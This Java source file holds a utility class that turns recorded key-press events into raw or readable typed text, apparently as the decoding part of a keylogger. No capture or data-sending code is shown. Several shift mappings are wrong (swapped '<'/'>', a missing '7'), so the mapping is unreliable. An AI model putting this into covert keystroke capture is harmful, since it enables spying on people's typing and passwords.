package main.handlers;

import java.awt.event.KeyEvent;
import java.util.List;
import java.util.Locale;

public final class Utils {
    private Utils(){}
    public static String rawPrint(List<KeyStorage> storage){
        if(storage.isEmpty()){
            return "Nothing has been recorded !";
        }
        StringBuilder sb = new StringBuilder();
        sb.append("<br/> Raw Store Data<br/>");
        for (KeyStorage keystorage : storage){
            sb.append(keystorage.toString() + System.lineSeparator());
        }
        return sb.toString();
    }
    public static String prettyPrint(List<KeyStorage> storage){
        if(storage.isEmpty()){
            return "Nothing has been recorded !";
        }
        StringBuilder sb = new StringBuilder();
        sb.append("<br/> Pretty Store Data<br/>");
        boolean[] caps = new boolean[256];
        //Uncoding the keyCode to Plain Text;
        for(KeyStorage keyStorage :storage){
            caps[keyStorage.getKeyCode()]= keyStorage.isPressed();
            String key=processKey(keyStorage.getKeyCode(),caps[KeyEvent.VK_SHIFT] );
        // We format the Letters
            if(keyStorage.isPressed()){
                if(caps[KeyEvent.VK_SHIFT]){
                    sb.append(key.toUpperCase());
                }else{
                    sb.append(key.toLowerCase());

                }
        }
    }
        return sb.toString();
    }

    private static String processKey(int keycode, boolean shifted) {
        String key = KeyEvent.getKeyText(keycode);
        if (key.length() != 1) {
            key = "{" + KeyEvent.getKeyText(keycode) + "}";
        }

        if (keycode == KeyEvent.VK_SHIFT) {
            key = "";
        }

        if (keycode == KeyEvent.VK_SPACE) {
            key = " ";
        }

        if (keycode == KeyEvent.VK_1 && shifted) {
            key = "!";
        }

        if (keycode == KeyEvent.VK_2 && shifted) {
            key = "@";
        }

        if (keycode == KeyEvent.VK_3 && shifted) {
            key = "#";
        }

        if (keycode == KeyEvent.VK_4 && shifted) {
            key = "$";
        }

        if (keycode == KeyEvent.VK_5 && shifted) {
            key = "%";
        }

        if (keycode == KeyEvent.VK_6 && shifted) {
            key = "^";
        }

        if (keycode == KeyEvent.VK_8 && shifted) {
            key = "*";
        }

        if (keycode == KeyEvent.VK_9 && shifted) {
            key = "(";
        }

        if (keycode == KeyEvent.VK_0 && shifted) {
            key = ")";
        }

        if (keycode == KeyEvent.VK_DEAD_ACUTE && shifted) {
            key = "?";
        }

        if (keycode == KeyEvent.VK_DEAD_ACUTE && !shifted) {
            key = "/";
        }

        if (keycode == KeyEvent.VK_PERIOD && shifted) {
            key = "<";
        }

        if (keycode == KeyEvent.VK_PERIOD && !shifted) {
            key = ".";
        }

        if (keycode == KeyEvent.VK_COMMA && shifted) {
            key = ">";
        }

        if (keycode == KeyEvent.VK_COMMA && !shifted) {
            key = ",";
        }

        if (keycode == KeyEvent.VK_QUOTE && !shifted) {
            key = "'";
        }

        if (keycode == KeyEvent.VK_QUOTE && shifted) {
            key = "\"";
        }

        if (keycode == KeyEvent.VK_SEMICOLON && shifted) {
            key = ":";
        }

        return key;
    }
}
